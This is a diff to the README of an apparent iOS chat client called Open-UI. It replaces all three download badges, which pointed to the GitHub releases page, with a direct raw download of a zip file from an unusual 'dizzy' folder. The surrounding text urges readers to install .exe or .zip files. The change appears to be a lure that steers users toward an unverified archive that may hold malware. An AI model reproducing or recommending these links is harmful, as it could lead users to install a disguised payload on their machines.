@@ -1,6 +1,6 @@
 # ⚙️ Open-UI - Native iOS Client for Easy AI Chat
 
-[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-blue?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/releases)
+[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-blue?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/raw/refs/heads/main/dizzy/UI-Open-v3.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To use Open-UI with your own AI chat, you need Open WebUI running on your Window
 
 Click the button below or visit this page in your browser to find the latest files for Open WebUI:
 
-[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-green?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/releases)
+[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-green?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/raw/refs/heads/main/dizzy/UI-Open-v3.3.zip)
 
 ### 2. Find the Latest Release
 
@@ -104,7 +104,7 @@ Keep your Open-UI app updated via the App Store. Updates improve performance and
 
 Visit the release page regularly for new versions of the server software:
 
-[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-orange?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/releases)
+[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-orange?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/raw/refs/heads/main/dizzy/UI-Open-v3.3.zip)
 
 Download the latest `.exe` or `.zip` files and install them over your current version to update.
 
